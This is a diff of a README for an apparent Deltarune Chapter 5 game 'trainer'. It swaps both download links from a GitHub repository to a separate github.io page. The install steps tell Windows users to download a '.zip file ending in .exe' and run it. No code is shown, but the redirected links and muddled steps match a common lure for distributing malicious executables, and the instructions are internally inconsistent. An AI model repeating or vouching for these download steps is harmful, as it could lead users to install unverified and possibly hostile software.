@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Ultimate-Trainer-2026 - Master every battle with ease
 
-[![](https://img.shields.io/badge/Download-Trainer-blue)](https://github.com/Eduriv3015/Deltarune-Chapter5-Ultimate-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Trainer-blue)](https://eduriv3015.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the repository page to download the latest version: [https://github.com/Eduriv3015/Deltarune-Chapter5-Ultimate-Trainer-2026](https://github.com/Eduriv3015/Deltarune-Chapter5-Ultimate-Trainer-2026).
+1. Visit the repository page to download the latest version: [https://eduriv3015.github.io](https://eduriv3015.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Click the link labeled "Assets" and choose the .zip file ending in .exe.
 4. Download the file to a folder you can find easily, such as your Desktop or Downloads folder.
